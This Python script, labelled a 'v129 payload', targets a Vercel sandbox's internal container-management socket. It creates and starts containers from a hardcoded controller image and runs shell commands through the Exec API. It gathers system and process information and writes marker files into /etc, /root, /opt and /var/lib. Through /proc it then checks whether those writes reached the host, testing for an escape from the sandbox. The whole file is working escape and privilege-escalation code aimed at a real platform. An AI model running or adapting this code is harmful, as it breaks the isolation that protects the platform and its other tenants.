# -*- coding: utf-8 -*-
"""v129 payload: cell API Create 进程覆盖 -> 保持 running -> Exec -> host 作用域验证
输出 /vercel/sandbox/v129c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v129c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 800] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=12.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        return status, body
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def scan_pids():
    out = {}
    try:
        for d in os.listdir('/proc'):
            if not d.isdigit():
                continue
            try:
                out[int(d)] = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                pass
    except Exception:
        pass
    return out


def pid_info(pid):
    res = []
    for p in ['cmdline', 'status', 'cgroup']:
        try:
            if p == 'cmdline':
                v = open('/proc/%d/cmdline' % pid, 'rb').read()[:400].replace(b'\x00', b' ')
                res.append('cmdline=%r' % v.decode(errors='replace'))
            elif p == 'status':
                v = open('/proc/%d/status' % pid).read()[:600]
                res.append('status=' + '|'.join(l for l in v.splitlines() if l.startswith(('Name:', 'Uid:', 'NSpid:', 'CapEff:', 'Seccomp:'))))
            else:
                res.append('cgroup=' + open('/proc/%d/cgroup' % pid).read().replace('\n', ' | '))
        except Exception as e:
            res.append('%s=EXC %s' % (p, e))
    return ' '.join(res)


# ---------------- 1: Create variants -> find running ----------------
log('=== 1 Create variants ===')
variants = [
    ('proc-args', {'image': IMG, 'process': {'args': ['/bin/sh', '-c', 'sleep 300']}}),
    ('cmd', {'image': IMG, 'command': ['/bin/sh', '-c', 'sleep 300']}),
    ('args', {'image': IMG, 'args': ['/bin/sh', '-c', 'sleep 300']}),
    ('proc-cmd', {'image': IMG, 'process': {'command': '/bin/sh -c sleep 300'}}),
    ('entrypoint', {'image': IMG, 'entrypoint': ['/bin/sh', '-c', 'sleep 300']}),
    ('plain', {'image': IMG}),
]
cids = []
for name, body in variants:
    st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps(body).encode(), t=12)
    cid = None
    try:
        cid = json.loads(pay.decode()).get('containerId')
    except Exception:
        pass
    log('Create[%s] -> %s %r cid=%s' % (name, st, pay[:250], cid))
    if cid:
        cids.append((name, cid))

# ---------------- 2: Start + running check ----------------
log('=== 2 Start ===')
before = scan_pids()
for name, cid in cids:
    st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    log('Start[%s] -> %s %r' % (name, st, pay[:200]))
    time.sleep(0.8)
    after = scan_pids()
    newp = [p for p in after if p not in before]
    log('Start[%s] new pids: %s' % (name, newp))
    for p in newp:
        log('NEWPID %d: %s' % (p, pid_info(p)))
        try:
            kids = [k for k, c in after.items() if k != p]
            log('NEWPID %d kids scan done (%d procs)' % (p, len(kids)))
        except Exception:
            pass
    before = after

# ---------------- 3: Exec on each (immediately) ----------------
log('=== 3 Exec ===')
CMD = ("echo ===E0===; id; hostname; pwd; uname -a; "
       "cat /proc/1/cmdline 2>&1 | head -c 300; echo; "
       "ls / 2>&1 | head -40; ls /volumes/ 2>&1 | head -20; "
       "ls /run/vercel/ 2>&1; cat /proc/self/cgroup 2>&1; "
       "echo ===E1===; "
       "echo HOSTMARK1 > /tmp/hostm1.txt 2>&1; echo HOSTMARK2 > /etc/hostm2.txt 2>&1; "
       "echo HOSTMARK3 > /opt/hostm3.txt 2>&1; echo HOSTMARK4 > /root/hostm4.txt 2>&1; "
       "echo HOSTMARK5 > /volumes/hostm5.txt 2>&1; "
       "echo HOSTMARK6 > /var/lib/hostm6.txt 2>&1; "
       "ls -la /tmp/ 2>&1 | head -15; "
       "echo ===E2===; sleep 180")
for name, cid in cids:
    st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                           json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=6)
    log('Exec[%s] -> %s %r' % (name, st, pay[:250]))
    pid = None
    try:
        pid = json.loads(pay.decode()).get('processId')
    except Exception:
        pass
    log('Exec[%s] processId=%s' % (name, pid))
    if pid:
        # pid 扫描
        time.sleep(2)
        after = scan_pids()
        newp = [p for p in after if p not in before]
        log('Exec[%s] new pids: %s' % (name, newp))
        for p in newp:
            log('EXECPID %d: %s' % (p, pid_info(p)))
            try:
                log('EXECPID %d root ls: %s' % (p, os.listdir('/proc/%d/root' % p)[:30]))
            except Exception as e:
                log('EXECPID %d root EXC %s' % (p, e))
            for mp in ['tmp/hostm1.txt', 'etc/hostm2.txt', 'opt/hostm3.txt', 'root/hostm4.txt',
                       'volumes/hostm5.txt', 'var/lib/hostm6.txt']:
                try:
                    log('EXECPID %d root %s: %r' % (p, mp, open('/proc/%d/root/%s' % (p, mp)).read().strip()))
                except Exception as e:
                    log('EXECPID %d root %s EXC %s' % (p, mp, e))
        before = after
        # StreamOutput
        for sv, sct in [('stdout', 'application/connect+json'), ('stderr', 'application/connect+json'), ('proto0', 'application/connect+proto')]:
            if sv == 'stdout':
                v = json.dumps({'processId': pid, 'stream': 'stdout'}).encode()
            elif sv == 'stderr':
                v = json.dumps({'processId': pid, 'stream': 'stderr'}).encode()
            else:
                v = b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x00'
            st, out = stream_data(CELL, '%s/StreamOutput' % PROC, v, sct, t=10)
            txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
            log('SO[%s/%s] %s out=%r' % (name, sv, st, txt[:600]))
        st, pay = connect_unix(CELL, '%s/Wait' % PROC, json.dumps({'processId': pid}).encode(), t=10)
        log('Wait[%s] -> %s %r' % (name, st, pay[:200]))
        break  # 第一个成功的 pid 即可

# ---------------- 4: marker 落点 (host /proc root 视角) ----------------
log('=== 4 markers via exec pids ===')
# 从所有 shim/容器进程的 root 检查
for p, c in scan_pids().items():
    if c in ('containerd-shim', 'sh', 'sleep'):
        for mp in ['tmp/hostm1.txt', 'etc/hostm2.txt', 'opt/hostm3.txt', 'root/hostm4.txt', 'volumes/hostm5.txt']:
            try:
                v = open('/proc/%d/root/%s' % (p, mp)).read().strip()
                if v:
                    log('PID %d (%s) root %s: %r' % (p, c, mp, v))
            except Exception:
                pass

log('V129_DONE')
f.close()
